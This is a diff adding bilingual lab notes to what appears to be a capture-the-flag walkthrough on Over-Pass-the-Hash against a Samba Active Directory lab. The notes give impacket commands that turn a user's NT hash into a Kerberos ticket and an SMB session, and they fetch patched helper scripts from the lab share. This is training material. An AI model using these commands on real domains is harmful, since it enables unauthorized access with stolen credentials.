@@ -47,6 +47,19 @@ impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad
     <pre>impacket-getTGT '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
 export KRB5CCNAME=a.miller.ccache
 impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}</pre>
+    <p><strong>Nota sobre este laboratorio:</strong> el comando de arriba revienta con <code>Attempted "__str__" operation on ASN.1 schema object</code> — es un bug real de impacket (confirmado en la versión de Kali y en la última de PyPI), no algo específico de Samba: <code>CCache.fromTGT()</code> no comprueba si el campo opcional <code>starttime</code> del AS-REP tiene valor antes de convertirlo a texto, y Samba lo omite (RFC 4120 §5.4.2 permite omitirlo; Windows AD casi siempre lo incluye, por eso el bug pasa desapercibido en producción). Descarga el wrapper que lo corrige (monkeypatch de una función, sin tocar impacket):</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get getTGT_fixed.py'
+
+python3 getTGT_fixed.py '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
+export KRB5CCNAME=a.miller.ccache
+klist</pre>
+    <p>El TGT ya es real y válido en este punto. El siguiente salto (pedir un TGS para <code>cifs/{{ ad_dc_host|lower }}</code> y usarlo contra SMB) topaba con un segundo bug de impacket, también real: <code>getKerberosTGS()</code> nunca manda el checksum <em>keyed</em> que RFC 4120 §5.5.1 exige en el Authenticator del TGS-REQ (key usage 6), y el KDC de Samba sí lo exige — sin él responde <code>KRB_AP_ERR_INAPP_CKSUM</code> (el mismo bug que bloqueaba Kerberoasting, ver AD 05). Con ese checksum añadido, el acceso SMB vía Kerberos funciona <strong>completamente en vivo</strong>:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get smbclient_fixed.py'
+
+python3 smbclient_fixed.py -k -no-pass {{ ad_dc_fqdn }} -dc-ip {{ ad_dc_ip }}
+# smb: \&gt; use finance
+# smb: \&gt; get flag-ad-11.txt</pre>
+    <p>Over-Pass-the-Hash completo y real: del hash NT de a.miller a una sesión SMB autenticada por Kerberos, sin conocer nunca su contraseña en claro.</p>
 
     <h3>5 · Capturar la flag</h3>
     <pre>impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad_dc_ip }}
@@ -96,6 +109,19 @@ impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad
     <pre>impacket-getTGT '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
 export KRB5CCNAME=a.miller.ccache
 impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}</pre>
+    <p><strong>Note about this lab:</strong> the command above blows up with <code>Attempted "__str__" operation on ASN.1 schema object</code> — this is a real impacket bug (confirmed in both Kali's packaged version and the latest PyPI release), not something Samba-specific: <code>CCache.fromTGT()</code> never checks whether the AS-REP's optional <code>starttime</code> field actually has a value before stringifying it, and Samba omits it (RFC 4120 §5.4.2 allows omitting it; Windows AD almost always includes it, which is why the bug goes unnoticed in production). Download the wrapper that fixes it (a one-function monkeypatch, impacket itself is untouched):</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get getTGT_fixed.py'
+
+python3 getTGT_fixed.py '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
+export KRB5CCNAME=a.miller.ccache
+klist</pre>
+    <p>The TGT is real and valid at this point. The next hop (requesting a TGS for <code>cifs/{{ ad_dc_host|lower }}</code> and using it against SMB) hit a second, equally real impacket bug: <code>getKerberosTGS()</code> never sends the <em>keyed</em> checksum RFC 4120 §5.5.1 requires in the TGS-REQ Authenticator (key usage 6), and Samba's KDC genuinely requires it — without it, it replies <code>KRB_AP_ERR_INAPP_CKSUM</code> (the same bug that blocked Kerberoasting, see AD 05). With that checksum added, Kerberos-based SMB access works <strong>fully live</strong>:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get smbclient_fixed.py'
+
+python3 smbclient_fixed.py -k -no-pass {{ ad_dc_fqdn }} -dc-ip {{ ad_dc_ip }}
+# smb: \&gt; use finance
+# smb: \&gt; get flag-ad-11.txt</pre>
+    <p>Full, real Over-Pass-the-Hash: from a.miller's NT hash to a Kerberos-authenticated SMB session, never knowing their cleartext password.</p>
 
     <h3>5 · Capture the flag</h3>
     <pre>impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad_dc_ip }}
